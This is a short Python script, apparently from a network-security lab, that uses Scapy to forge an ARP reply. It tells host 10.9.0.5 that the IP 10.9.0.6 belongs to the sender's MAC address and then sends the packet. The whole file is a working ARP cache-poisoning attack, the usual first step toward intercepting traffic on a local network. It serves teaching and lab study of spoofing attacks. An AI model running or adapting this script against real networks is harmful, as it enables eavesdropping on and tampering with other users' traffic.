
#!/usr/bin/env python3
from scapy.all import *

A = "10.9.0.5"
A_mac = "02:42:0a:09:00:05"
B = "10.9.0.6"

E_layer = Ether()
E_layer.dst = A_mac
A_layer = ARP()
A_layer.psrc = B
A_layer.pdst = A
A_layer.op = 2

pkt = E_layer / A_layer
pkt.show()

sendp(pkt)

